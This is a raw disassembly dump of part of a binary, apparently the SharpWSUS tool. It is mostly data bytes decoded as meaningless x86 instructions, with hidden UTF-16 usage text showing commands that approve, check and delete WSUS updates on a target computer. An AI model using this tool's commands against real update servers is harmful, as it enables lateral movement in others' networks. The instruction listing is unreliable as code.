  40d2a8:	74 00                	je     0x40d2aa
  40d2aa:	65 00 22             	add    %ah,%gs:(%edx)
  40d2ad:	00 20                	add    %ah,(%eax)
  40d2af:	00 2f                	add    %ch,(%edi)
  40d2b1:	00 75 00             	add    %dh,0x0(%ebp)
  40d2b4:	72 00                	jb     0x40d2b6
  40d2b6:	6c                   	insb   (%dx),%es:(%edi)
  40d2b7:	00 3a                	add    %bh,(%edx)
  40d2b9:	00 22                	add    %ah,(%edx)
  40d2bb:	00 68 00             	add    %ch,0x0(%eax)
  40d2be:	74 00                	je     0x40d2c0
  40d2c0:	74 00                	je     0x40d2c2
  40d2c2:	70 00                	jo     0x40d2c4
  40d2c4:	73 00                	jae    0x40d2c6
  40d2c6:	3a 00                	cmp    (%eax),%al
  40d2c8:	2f                   	das
  40d2c9:	00 2f                	add    %ch,(%edi)
  40d2cb:	00 67 00             	add    %ah,0x0(%edi)
  40d2ce:	6f                   	outsl  %ds:(%esi),(%dx)
  40d2cf:	00 6f 00             	add    %ch,0x0(%edi)
  40d2d2:	67 00 6c 00          	add    %ch,0x0(%si)
  40d2d6:	65 00 2e             	add    %ch,%gs:(%esi)
  40d2d9:	00 63 00             	add    %ah,0x0(%ebx)
  40d2dc:	6f                   	outsl  %ds:(%esi),(%dx)
  40d2dd:	00 6d 00             	add    %ch,0x0(%ebp)
  40d2e0:	22 00                	and    (%eax),%al
  40d2e2:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  40d2e7:	00 20                	add    %ah,(%eax)
  40d2e9:	00 20                	add    %ah,(%eax)
  40d2eb:	00 20                	add    %ah,(%eax)
  40d2ed:	00 53 00             	add    %dl,0x0(%ebx)
  40d2f0:	68 00 61 00 72       	push   $0x72006100
  40d2f5:	00 70 00             	add    %dh,0x0(%eax)
  40d2f8:	57                   	push   %edi
  40d2f9:	00 53 00             	add    %dl,0x0(%ebx)
  40d2fc:	55                   	push   %ebp
  40d2fd:	00 53 00             	add    %dl,0x0(%ebx)
  40d300:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40d304:	78 00                	js     0x40d306
  40d306:	65 00 20             	add    %ah,%gs:(%eax)
  40d309:	00 61 00             	add    %ah,0x0(%ecx)
  40d30c:	70 00                	jo     0x40d30e
  40d30e:	70 00                	jo     0x40d310
  40d310:	72 00                	jb     0x40d312
  40d312:	6f                   	outsl  %ds:(%esi),(%dx)
  40d313:	00 76 00             	add    %dh,0x0(%esi)
  40d316:	65 00 20             	add    %ah,%gs:(%eax)
  40d319:	00 2f                	add    %ch,(%edi)
  40d31b:	00 75 00             	add    %dh,0x0(%ebp)
  40d31e:	70 00                	jo     0x40d320
  40d320:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40d324:	74 00                	je     0x40d326
  40d326:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40d32a:	64 00 3a             	add    %bh,%fs:(%edx)
  40d32d:	00 39                	add    %bh,(%ecx)
  40d32f:	00 33                	add    %dh,(%ebx)
  40d331:	00 36                	add    %dh,(%esi)
  40d333:	00 34 00             	add    %dh,(%eax,%eax,1)
  40d336:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40d33a:	34 00                	xor    $0x0,%al
  40d33c:	39 00                	cmp    %eax,(%eax)
  40d33e:	2d 00 37 00 64       	sub    $0x64003700,%eax
  40d343:	00 32                	add    %dh,(%edx)
  40d345:	00 31                	add    %dh,(%ecx)
  40d347:	00 2d 00 34 00 35    	add    %ch,0x35003400
  40d34d:	00 37                	add    %dh,(%edi)
  40d34f:	00 36                	add    %dh,(%esi)
  40d351:	00 2d 00 39 00 39    	add    %ch,0x39003900
  40d357:	00 32                	add    %dh,(%edx)
  40d359:	00 32                	add    %dh,(%edx)
  40d35b:	00 2d 00 39 00 63    	add    %ch,0x63003900
  40d361:	00 62 00             	add    %ah,0x0(%edx)
  40d364:	63 00                	arpl   %eax,(%eax)
  40d366:	63 00                	arpl   %eax,(%eax)
  40d368:	65 00 39             	add    %bh,%gs:(%ecx)
  40d36b:	00 66 00             	add    %ah,0x0(%esi)
  40d36e:	38 00                	cmp    %al,(%eax)
  40d370:	35 00 35 00 33       	xor    $0x33003500,%eax
  40d375:	00 20                	add    %ah,(%eax)
  40d377:	00 2f                	add    %ch,(%edi)
  40d379:	00 63 00             	add    %ah,0x0(%ebx)
  40d37c:	6f                   	outsl  %ds:(%esi),(%dx)
  40d37d:	00 6d 00             	add    %ch,0x0(%ebp)
  40d380:	70 00                	jo     0x40d382
  40d382:	75 00                	jne    0x40d384
  40d384:	74 00                	je     0x40d386
  40d386:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40d38a:	6e                   	outsb  %ds:(%esi),(%dx)
  40d38b:	00 61 00             	add    %ah,0x0(%ecx)
  40d38e:	6d                   	insl   (%dx),%es:(%edi)
  40d38f:	00 65 00             	add    %ah,0x0(%ebp)
  40d392:	3a 00                	cmp    (%eax),%al
  40d394:	74 00                	je     0x40d396
  40d396:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40d39a:	74 00                	je     0x40d39c
  40d39c:	31 00                	xor    %eax,(%eax)
  40d39e:	20 00                	and    %al,(%eax)
  40d3a0:	2f                   	das
  40d3a1:	00 67 00             	add    %ah,0x0(%edi)
  40d3a4:	72 00                	jb     0x40d3a6
  40d3a6:	6f                   	outsl  %ds:(%esi),(%dx)
  40d3a7:	00 75 00             	add    %dh,0x0(%ebp)
  40d3aa:	70 00                	jo     0x40d3ac
  40d3ac:	6e                   	outsb  %ds:(%esi),(%dx)
  40d3ad:	00 61 00             	add    %ah,0x0(%ecx)
  40d3b0:	6d                   	insl   (%dx),%es:(%edi)
  40d3b1:	00 65 00             	add    %ah,0x0(%ebp)
  40d3b4:	3a 00                	cmp    (%eax),%al
  40d3b6:	22 00                	and    (%eax),%al
  40d3b8:	47                   	inc    %edi
  40d3b9:	00 72 00             	add    %dh,0x0(%edx)
  40d3bc:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40d3c0:	74 00                	je     0x40d3c2
  40d3c2:	20 00                	and    %al,(%eax)
  40d3c4:	47                   	inc    %edi
  40d3c5:	00 72 00             	add    %dh,0x0(%edx)
  40d3c8:	6f                   	outsl  %ds:(%esi),(%dx)
  40d3c9:	00 75 00             	add    %dh,0x0(%ebp)
  40d3cc:	70 00                	jo     0x40d3ce
  40d3ce:	22 00                	and    (%eax),%al
  40d3d0:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  40d3d5:	00 20                	add    %ah,(%eax)
  40d3d7:	00 20                	add    %ah,(%eax)
  40d3d9:	00 20                	add    %ah,(%eax)
  40d3db:	00 53 00             	add    %dl,0x0(%ebx)
  40d3de:	68 00 61 00 72       	push   $0x72006100
  40d3e3:	00 70 00             	add    %dh,0x0(%eax)
  40d3e6:	57                   	push   %edi
  40d3e7:	00 53 00             	add    %dl,0x0(%ebx)
  40d3ea:	55                   	push   %ebp
  40d3eb:	00 53 00             	add    %dl,0x0(%ebx)
  40d3ee:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40d3f2:	78 00                	js     0x40d3f4
  40d3f4:	65 00 20             	add    %ah,%gs:(%eax)
  40d3f7:	00 63 00             	add    %ah,0x0(%ebx)
  40d3fa:	68 00 65 00 63       	push   $0x63006500
  40d3ff:	00 6b 00             	add    %ch,0x0(%ebx)
  40d402:	20 00                	and    %al,(%eax)
  40d404:	2f                   	das
  40d405:	00 75 00             	add    %dh,0x0(%ebp)
  40d408:	70 00                	jo     0x40d40a
  40d40a:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40d40e:	74 00                	je     0x40d410
  40d410:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40d414:	64 00 3a             	add    %bh,%fs:(%edx)
  40d417:	00 39                	add    %bh,(%ecx)
  40d419:	00 33                	add    %dh,(%ebx)
  40d41b:	00 36                	add    %dh,(%esi)
  40d41d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40d420:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40d424:	34 00                	xor    $0x0,%al
  40d426:	39 00                	cmp    %eax,(%eax)
  40d428:	2d 00 37 00 64       	sub    $0x64003700,%eax
  40d42d:	00 32                	add    %dh,(%edx)
  40d42f:	00 31                	add    %dh,(%ecx)
  40d431:	00 2d 00 34 00 35    	add    %ch,0x35003400
  40d437:	00 37                	add    %dh,(%edi)
  40d439:	00 36                	add    %dh,(%esi)
  40d43b:	00 2d 00 39 00 39    	add    %ch,0x39003900
  40d441:	00 32                	add    %dh,(%edx)
  40d443:	00 32                	add    %dh,(%edx)
  40d445:	00 2d 00 39 00 63    	add    %ch,0x63003900
  40d44b:	00 62 00             	add    %ah,0x0(%edx)
  40d44e:	63 00                	arpl   %eax,(%eax)
  40d450:	63 00                	arpl   %eax,(%eax)
  40d452:	65 00 39             	add    %bh,%gs:(%ecx)
  40d455:	00 66 00             	add    %ah,0x0(%esi)
  40d458:	38 00                	cmp    %al,(%eax)
  40d45a:	35 00 35 00 33       	xor    $0x33003500,%eax
  40d45f:	00 20                	add    %ah,(%eax)
  40d461:	00 2f                	add    %ch,(%edi)
  40d463:	00 63 00             	add    %ah,0x0(%ebx)
  40d466:	6f                   	outsl  %ds:(%esi),(%dx)
  40d467:	00 6d 00             	add    %ch,0x0(%ebp)
  40d46a:	70 00                	jo     0x40d46c
  40d46c:	75 00                	jne    0x40d46e
  40d46e:	74 00                	je     0x40d470
  40d470:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40d474:	6e                   	outsb  %ds:(%esi),(%dx)
  40d475:	00 61 00             	add    %ah,0x0(%ecx)
  40d478:	6d                   	insl   (%dx),%es:(%edi)
  40d479:	00 65 00             	add    %ah,0x0(%ebp)
  40d47c:	3a 00                	cmp    (%eax),%al
  40d47e:	74 00                	je     0x40d480
  40d480:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40d484:	74 00                	je     0x40d486
  40d486:	31 00                	xor    %eax,(%eax)
  40d488:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  40d48d:	00 20                	add    %ah,(%eax)
  40d48f:	00 20                	add    %ah,(%eax)
  40d491:	00 20                	add    %ah,(%eax)
  40d493:	00 53 00             	add    %dl,0x0(%ebx)
  40d496:	68 00 61 00 72       	push   $0x72006100
  40d49b:	00 70 00             	add    %dh,0x0(%eax)
  40d49e:	57                   	push   %edi
  40d49f:	00 53 00             	add    %dl,0x0(%ebx)
  40d4a2:	55                   	push   %ebp
  40d4a3:	00 53 00             	add    %dl,0x0(%ebx)
  40d4a6:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40d4aa:	78 00                	js     0x40d4ac
  40d4ac:	65 00 20             	add    %ah,%gs:(%eax)
  40d4af:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40d4b3:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40d4b7:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40d4bb:	00 20                	add    %ah,(%eax)
  40d4bd:	00 2f                	add    %ch,(%edi)
  40d4bf:	00 75 00             	add    %dh,0x0(%ebp)
  40d4c2:	70 00                	jo     0x40d4c4
  40d4c4:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40d4c8:	74 00                	je     0x40d4ca
  40d4ca:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40d4ce:	64 00 3a             	add    %bh,%fs:(%edx)
  40d4d1:	00 39                	add    %bh,(%ecx)
  40d4d3:	00 33                	add    %dh,(%ebx)
  40d4d5:	00 36                	add    %dh,(%esi)
  40d4d7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40d4da:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40d4de:	34 00                	xor    $0x0,%al
  40d4e0:	39 00                	cmp    %eax,(%eax)
  40d4e2:	2d 00 37 00 64       	sub    $0x64003700,%eax
  40d4e7:	00 32                	add    %dh,(%edx)
  40d4e9:	00 31                	add    %dh,(%ecx)
  40d4eb:	00 2d 00 34 00 35    	add    %ch,0x35003400
  40d4f1:	00 37                	add    %dh,(%edi)
  40d4f3:	00 36                	add    %dh,(%esi)
  40d4f5:	00 2d 00 39 00 39    	add    %ch,0x39003900
  40d4fb:	00 32                	add    %dh,(%edx)
  40d4fd:	00 32                	add    %dh,(%edx)
  40d4ff:	00 2d 00 39 00 63    	add    %ch,0x63003900
  40d505:	00 62 00             	add    %ah,0x0(%edx)
  40d508:	63 00                	arpl   %eax,(%eax)
  40d50a:	63 00                	arpl   %eax,(%eax)
  40d50c:	65 00 39             	add    %bh,%gs:(%ecx)
  40d50f:	00 66 00             	add    %ah,0x0(%esi)
  40d512:	38 00                	cmp    %al,(%eax)
  40d514:	35 00 35 00 33       	xor    $0x33003500,%eax
  40d519:	00 20                	add    %ah,(%eax)
  40d51b:	00 2f                	add    %ch,(%edi)
  40d51d:	00 63 00             	add    %ah,0x0(%ebx)
  40d520:	6f                   	outsl  %ds:(%esi),(%dx)
  40d521:	00 6d 00             	add    %ch,0x0(%ebp)
  40d524:	70 00                	jo     0x40d526
  40d526:	75 00                	jne    0x40d528
  40d528:	74 00                	je     0x40d52a
  40d52a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40d52e:	6e                   	outsb  %ds:(%esi),(%dx)
  40d52f:	00 61 00             	add    %ah,0x0(%ecx)
  40d532:	6d                   	insl   (%dx),%es:(%edi)
  40d533:	00 65 00             	add    %ah,0x0(%ebp)
  40d536:	3a 00                	cmp    (%eax),%al
  40d538:	74 00                	je     0x40d53a
  40d53a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40d53e:	74 00                	je     0x40d540
  40d540:	31 00                	xor    %eax,(%eax)
  40d542:	20 00                	and    %al,(%eax)
  40d544:	2f                   	das
  40d545:	00 67 00             	add    %ah,0x0(%edi)
  40d548:	72 00                	jb     0x40d54a
  40d54a:	6f                   	outsl  %ds:(%esi),(%dx)
  40d54b:	00 75 00             	add    %dh,0x0(%ebp)
  40d54e:	70 00                	jo     0x40d550
  40d550:	6e                   	outsb  %ds:(%esi),(%dx)
  40d551:	00 61 00             	add    %ah,0x0(%ecx)
  40d554:	6d                   	insl   (%dx),%es:(%edi)
  40d555:	00 65 00             	add    %ah,0x0(%ebp)
  40d558:	3a 00                	cmp    (%eax),%al
  40d55a:	22 00                	and    (%eax),%al
  40d55c:	47                   	inc    %edi
  40d55d:	00 72 00             	add    %dh,0x0(%edx)
  40d560:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40d564:	74 00                	je     0x40d566
  40d566:	20 00                	and    %al,(%eax)
  40d568:	47                   	inc    %edi
  40d569:	00 72 00             	add    %dh,0x0(%edx)
  40d56c:	6f                   	outsl  %ds:(%esi),(%dx)
  40d56d:	00 75 00             	add    %dh,0x0(%ebp)
  40d570:	70 00                	jo     0x40d572
  40d572:	22 00                	and    (%eax),%al
  40d574:	0d 00 0a 00 01       	or     $0x1000a00,%eax
  40d579:	03 2d 00 01 00 00    	add    0x100,%ebp
  40d57f:	00 2e                	add    %ch,(%esi)
  40d581:	2c 04                	sub    $0x4,%al
  40d583:	15 68 7e e3 46       	adc    $0x46e37e68,%eax
  40d588:	b5 8a                	mov    $0x8a,%ch
  40d58a:	ca 56 5e             	lret   $0x5e56
  40d58d:	82 86 34 00 04 20 01 	addb   $0x1,0x20040034(%esi)
  40d594:	01 08                	add    %ecx,(%eax)
  40d596:	03 20                	add    (%eax),%esp
  40d598:	00 01                	add    %al,(%ecx)
  40d59a:	05 20 01 01 11       	add    $0x11010120,%eax
  40d59f:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  40d5a2:	01 01                	add    %eax,(%ecx)
  40d5a4:	0e                   	push   %cs
  40d5a5:	04 20                	add    $0x20,%al
  40d5a7:	01 01                	add    %eax,(%ecx)
  40d5a9:	02 06                	add    (%esi),%al
  40d5ab:	20 01                	and    %al,(%ecx)
  40d5ad:	01 11                	add    %edx,(%ecx)
  40d5af:	80 81 0e 07 07 12 49 	addb   $0x49,0x1207070e(%ecx)
  40d5b6:	12 4d 12             	adc    0x12(%ebp),%cl
  40d5b9:	51                   	push   %ecx
  40d5ba:	11 55 02             	adc    %edx,0x2(%ebp)
  40d5bd:	02 12                	add    (%edx),%dl
  40d5bf:	59                   	pop    %ecx
  40d5c0:	05 20 01 12 51       	add    $0x51120120,%eax
  40d5c5:	0e                   	push   %cs
  40d5c6:	03 20                	add    (%eax),%esp
  40d5c8:	00 0e                	add    %cl,(%esi)
  40d5ca:	06                   	push   %es
  40d5cb:	00 03                	add    %al,(%ebx)
  40d5cd:	0e                   	push   %cs
  40d5ce:	0e                   	push   %cs
  40d5cf:	0e                   	push   %cs
  40d5d0:	0e                   	push   %cs
  40d5d1:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40d5d6:	0e                   	push   %cs
  40d5d7:	04 20                	add    $0x20,%al
  40d5d9:	00 12                	add    %dl,(%edx)
  40d5db:	4d                   	dec    %ebp
  40d5dc:	06                   	push   %es
  40d5dd:	20 01                	and    %al,(%ecx)
  40d5df:	01 12                	add    %edx,(%edx)
  40d5e1:	80 99 05 20 00 12 80 	sbbb   $0x80,0x12002005(%ecx)
  40d5e8:	9d                   	popf
  40d5e9:	06                   	push   %es
  40d5ea:	20 01                	and    %al,(%ecx)
  40d5ec:	12 80 a1 08 04 20    	adc    0x200408a1(%eax),%al
  40d5f2:	01 1c 08             	add    %ebx,(%eax,%ecx,1)
  40d5f5:	04 00                	add    $0x0,%al
  40d5f7:	01 01                	add    %eax,(%ecx)
  40d5f9:	0e                   	push   %cs
  40d5fa:	05 00 02 01 0e       	add    $0xe010200,%eax
  40d5ff:	1c 05                	sbb    $0x5,%al
  40d601:	00 02                	add    %al,(%edx)
  40d603:	0e                   	push   %cs
  40d604:	0e                   	push   %cs
  40d605:	0e                   	push   %cs
  40d606:	0b 07                	or     (%edi),%eax
  40d608:	05 12 4d 12 51       	add    $0x51124d12,%eax
  40d60d:	11 55 02             	adc    %edx,0x2(%ebp)
  40d610:	12 59 0c             	adc    0xc(%ecx),%bl
  40d613:	07                   	pop    %es
  40d614:	07                   	pop    %es
  40d615:	12 4d 12             	adc    0x12(%ebp),%cl
  40d618:	51                   	push   %ecx
  40d619:	0e                   	push   %cs
  40d61a:	02 02                	add    (%edx),%al
  40d61c:	02 12                	add    (%edx),%dl
  40d61e:	59                   	pop    %ecx
  40d61f:	02 06                	add    (%esi),%al
  40d621:	0e                   	push   %cs
  40d622:	09 07                	or     %eax,(%edi)
  40d624:	04 12                	add    $0x12,%al
  40d626:	4d                   	dec    %ebp
  40d627:	12 51 02             	adc    0x2(%ecx),%dl
  40d62a:	12 59 0e             	adc    0xe(%ecx),%bl
  40d62d:	07                   	pop    %es
  40d62e:	07                   	pop    %es
  40d62f:	12 4d 12             	adc    0x12(%ebp),%cl
  40d632:	51                   	push   %ecx
  40d633:	12 49 11             	adc    0x11(%ecx),%cl
  40d636:	55                   	push   %ebp
  40d637:	02 02                	add    (%edx),%al
  40d639:	12 59 0a             	adc    0xa(%ecx),%bl
  40d63c:	07                   	pop    %es
  40d63d:	05 12 5d 02 02       	add    $0x2025d12,%eax
  40d642:	12 59 12             	adc    0x12(%ecx),%bl
  40d645:	5d                   	pop    %ebp
  40d646:	04 20                	add    $0x20,%al
  40d648:	01 02                	add    %eax,(%edx)
  40d64a:	0e                   	push   %cs
  40d64b:	08 07                	or     %al,(%edi)
  40d64d:	04 12                	add    $0x12,%al
  40d64f:	4d                   	dec    %ebp
  40d650:	02 02                	add    (%edx),%al
  40d652:	12 59 03             	adc    0x3(%ecx),%bl
  40d655:	20 00                	and    %al,(%eax)
  40d657:	02 04 20             	add    (%eax,%eiz,1),%al
  40d65a:	01 08                	add    %ecx,(%eax)
  40d65c:	0e                   	push   %cs
  40d65d:	03 00                	add    (%eax),%eax
  40d65f:	00 0e                	add    %cl,(%esi)
  40d661:	07                   	pop    %es
  40d662:	00 04 01             	add    %al,(%ecx,%eax,1)
  40d665:	0e                   	push   %cs
  40d666:	1c 1c                	sbb    $0x1c,%al
  40d668:	1c 09                	sbb    $0x9,%al
  40d66a:	07                   	pop    %es
  40d66b:	05 12 4d 08 02       	add    $0x2084d12,%eax
  40d670:	02 12                	add    (%edx),%dl
  40d672:	59                   	pop    %ecx
  40d673:	03 20                	add    (%eax),%esp
  40d675:	00 08                	add    %cl,(%eax)
  40d677:	06                   	push   %es
  40d678:	00 02                	add    %al,(%edx)
  40d67a:	01 0e                	add    %ecx,(%esi)
  40d67c:	1d 1c 06 07 03       	sbb    $0x307061c,%eax
  40d681:	0e                   	push   %cs
  40d682:	02 12                	add    (%edx),%dl
  40d684:	59                   	pop    %ecx
  40d685:	06                   	push   %es
  40d686:	00 03                	add    %al,(%ebx)
  40d688:	1c 0e                	sbb    $0xe,%al
  40d68a:	0e                   	push   %cs
  40d68b:	1c 03                	sbb    $0x3,%al
  40d68d:	07                   	pop    %es
  40d68e:	01 02                	add    %eax,(%edx)
  40d690:	04 00                	add    $0x0,%al
  40d692:	01 0e                	add    %ecx,(%esi)
  40d694:	0e                   	push   %cs
  40d695:	03 20                	add    (%eax),%esp
  40d697:	00 0a                	add    %cl,(%edx)
  40d699:	05 07 02 02 12       	add    $0x12020207,%eax
  40d69e:	59                   	pop    %ecx
  40d69f:	06                   	push   %es
  40d6a0:	00 03                	add    %al,(%ebx)
  40d6a2:	01 0e                	add    %ecx,(%esi)
  40d6a4:	0e                   	push   %cs
  40d6a5:	02 07                	add    (%edi),%al
  40d6a7:	07                   	pop    %es
  40d6a8:	03 12                	add    (%edx),%edx
  40d6aa:	61                   	popa
  40d6ab:	12 65 0e             	adc    0xe(%ebp),%ah
  40d6ae:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40d6b3:	11 80 cd 11 80 d1    	adc    %eax,-0x2e7fee33(%eax)
  40d6b9:	11 80 d5 07 20 01    	adc    %eax,0x12007d5(%eax)
  40d6bf:	1d 05 12 80 dd       	sbb    $0xdd801205,%eax
  40d6c4:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40d6c9:	05 07 07 03 12       	add    $0x12030707,%eax
  40d6ce:	61                   	popa
  40d6cf:	12 69 0e             	adc    0xe(%ecx),%ch
  40d6d2:	0a 07                	or     (%edi),%al
  40d6d4:	06                   	push   %es
  40d6d5:	12 4d 02             	adc    0x2(%ebp),%cl
  40d6d8:	02 02                	add    (%edx),%al
  40d6da:	02 12                	add    (%edx),%dl
  40d6dc:	59                   	pop    %ecx
  40d6dd:	06                   	push   %es
  40d6de:	00 03                	add    %al,(%ebx)
  40d6e0:	01 0e                	add    %ecx,(%esi)
  40d6e2:	1c 1c                	sbb    $0x1c,%al
  40d6e4:	09 07                	or     %eax,(%edi)
  40d6e6:	06                   	push   %es
  40d6e7:	12 4d 08             	adc    0x8(%ebp),%cl
  40d6ea:	0e                   	push   %cs
  40d6eb:	02 02                	add    (%edx),%al
  40d6ed:	02 05 00 02 02 0e    	add    0xe020200,%al
  40d6f3:	0e                   	push   %cs
  40d6f4:	09 07                	or     %eax,(%edi)
  40d6f6:	04 12                	add    $0x12,%al
  40d6f8:	4d                   	dec    %ebp
  40d6f9:	11 55 12             	adc    %edx,0x12(%ebp)
  40d6fc:	59                   	pop    %ecx
  40d6fd:	02 07                	add    (%edi),%al
  40d6ff:	00 04 0e             	add    %al,(%esi,%ecx,1)
  40d702:	0e                   	push   %cs
  40d703:	0e                   	push   %cs
  40d704:	0e                   	push   %cs
  40d705:	0e                   	push   %cs
  40d706:	04 00                	add    $0x0,%al
  40d708:	00 11                	add    %dl,(%ecx)
  40d70a:	55                   	push   %ebp
  40d70b:	05 07 03 0e 02       	add    $0x20e0307,%eax
  40d710:	02 06                	add    (%esi),%al
  40d712:	00 01                	add    %al,(%ecx)
  40d714:	12 80 e9 0e 08 07    	adc    0x7080ee9(%eax),%al
  40d71a:	06                   	push   %es
  40d71b:	0e                   	push   %cs
  40d71c:	0e                   	push   %cs
  40d71d:	02 02                	add    (%edx),%al
  40d71f:	02 02                	add    (%edx),%al
  40d721:	06                   	push   %es
  40d722:	07                   	pop    %es
  40d723:	04 0e                	add    $0xe,%al
  40d725:	02 02                	add    (%edx),%al
  40d727:	02 09                	add    (%ecx),%cl
  40d729:	07                   	pop    %es
  40d72a:	07                   	pop    %es
  40d72b:	0e                   	push   %cs
  40d72c:	08 0e                	or     %cl,(%esi)
  40d72e:	08 03                	or     %al,(%ebx)
  40d730:	02 0e                	add    (%esi),%cl
  40d732:	05 20 02 0e 08       	add    $0x80e0220,%eax
  40d737:	08 05 00 02 08 0e    	or     %al,0xe080200
  40d73d:	08 05 07 02 1d 03    	or     %al,0x31d0207
  40d743:	0e                   	push   %cs
  40d744:	04 20                	add    $0x20,%al
  40d746:	00 1d 03 06 00 01    	add    %bl,0x1000603
  40d74c:	01 12                	add    %edx,(%edx)
  40d74e:	80 f1 05             	xor    $0x5,%cl
  40d751:	20 01                	and    %al,(%ecx)
  40d753:	01 1d 03 09 07 04    	add    %ebx,0x4070903
  40d759:	12 4d 12             	adc    0x12(%ebp),%cl
  40d75c:	59                   	pop    %ecx
  40d75d:	02 12                	add    (%edx),%dl
  40d75f:	59                   	pop    %ecx
  40d760:	13 07                	adc    (%edi),%eax
  40d762:	0e                   	push   %cs
  40d763:	08 12                	or     %dl,(%edx)
  40d765:	4d                   	dec    %ebp
  40d766:	12 59 02             	adc    0x2(%ecx),%bl
  40d769:	02 12                	add    (%edx),%dl
  40d76b:	59                   	pop    %ecx
  40d76c:	02 08                	add    (%eax),%cl
  40d76e:	02 02                	add    (%edx),%al
  40d770:	02 02                	add    (%edx),%al
  40d772:	02 02                	add    (%edx),%al
  40d774:	06                   	push   %es
  40d775:	07                   	pop    %es
  40d776:	03 02                	add    (%edx),%eax
  40d778:	02 12                	add    (%edx),%dl
  40d77a:	59                   	pop    %ecx
  40d77b:	04 00                	add    $0x0,%al
  40d77d:	01 01                	add    %eax,(%ecx)
  40d77f:	1c 06                	sbb    $0x6,%al
  40d781:	07                   	pop    %es
  40d782:	03 12                	add    (%edx),%edx
  40d784:	50                   	push   %eax
  40d785:	0e                   	push   %cs
  40d786:	02 12                	add    (%edx),%dl
  40d788:	07                   	pop    %es
  40d789:	0f 0e                	femms
  40d78b:	0e                   	push   %cs
  40d78c:	0e                   	push   %cs
  40d78d:	0e                   	push   %cs
  40d78e:	12 45 02             	adc    0x2(%ebp),%al
  40d791:	02 02                	add    (%edx),%al
  40d793:	02 02                	add    (%edx),%al
  40d795:	02 02                	add    (%edx),%al
  40d797:	02 02                	add    (%edx),%al
  40d799:	02 06                	add    (%esi),%al
  40d79b:	15 12 71 02 0e       	adc    $0xe027112,%eax
  40d7a0:	0e                   	push   %cs
  40d7a1:	05 20 01 02 13       	add    $0x13020120,%eax
  40d7a6:	00 06                	add    %al,(%esi)
  40d7a8:	20 01                	and    %al,(%ecx)
  40d7aa:	13 01                	adc    (%ecx),%eax
  40d7ac:	13 00                	adc    (%eax),%eax
  40d7ae:	05 20 01 01 12       	add    $0x12010120,%eax
  40d7b3:	5d                   	pop    %ebp
  40d7b4:	0a 07                	or     (%edi),%al
  40d7b6:	07                   	pop    %es
  40d7b7:	0e                   	push   %cs
  40d7b8:	0e                   	push   %cs
  40d7b9:	12 45 02             	adc    0x2(%ebp),%al
  40d7bc:	02 02                	add    (%edx),%al
  40d7be:	02 19                	add    (%ecx),%bl
  40d7c0:	07                   	pop    %es
  40d7c1:	14 12                	adc    $0x12,%al
  40d7c3:	45                   	inc    %ebp
  40d7c4:	12 14 02             	adc    (%edx,%eax,1),%dl
  40d7c7:	02 02                	add    (%edx),%al
  40d7c9:	02 02                	add    (%edx),%al
  40d7cb:	02 02                	add    (%edx),%al
  40d7cd:	02 02                	add    (%edx),%al
  40d7cf:	02 02                	add    (%edx),%al
  40d7d1:	02 02                	add    (%edx),%al
  40d7d3:	02 02                	add    (%edx),%al
  40d7d5:	02 02                	add    (%edx),%al
  40d7d7:	11 55 13             	adc    %edx,0x13(%ebp)
  40d7da:	07                   	pop    %es
  40d7db:	10 0e                	adc    %cl,(%esi)
  40d7dd:	0e                   	push   %cs
  40d7de:	0e                   	push   %cs
  40d7df:	02 12                	add    (%edx),%dl
  40d7e1:	45                   	inc    %ebp
  40d7e2:	02 02                	add    (%edx),%al
  40d7e4:	02 02                	add    (%edx),%al
  40d7e6:	02 02                	add    (%edx),%al
  40d7e8:	02 02                	add    (%edx),%al
  40d7ea:	02 02                	add    (%edx),%al
  40d7ec:	02 04 07             	add    (%edi,%eax,1),%al
  40d7ef:	01 12                	add    %edx,(%edx)
  40d7f1:	45                   	inc    %ebp
  40d7f2:	15 07 08 15 12       	adc    $0x12150807,%eax
  40d7f7:	71 02                	jno    0x40d7fb
  40d7f9:	0e                   	push   %cs
  40d7fa:	0e                   	push   %cs
  40d7fb:	15 12 79 01 0e       	adc    $0xe017912,%eax
  40d800:	0e                   	push   %cs
  40d801:	08 02                	or     %al,(%edx)
  40d803:	02 12                	add    (%edx),%dl
  40d805:	50                   	push   %eax
  40d806:	12 59 05             	adc    0x5(%ecx),%bl
  40d809:	15 12 75 01 0e       	adc    $0xe017512,%eax
  40d80e:	08 20                	or     %ah,(%eax)
  40d810:	00 15 12 79 01 13    	add    %dl,0x13017912
  40d816:	00 05 15 12 79 01    	add    %al,0x1791215
  40d81c:	0e                   	push   %cs
  40d81d:	04 20                	add    $0x20,%al
  40d81f:	00 13                	add    %dl,(%ebx)
  40d821:	00 04 20             	add    %al,(%eax,%eiz,1)
  40d824:	01 08                	add    %ecx,(%eax)
  40d826:	03 04 20             	add    (%eax,%eiz,1),%eax
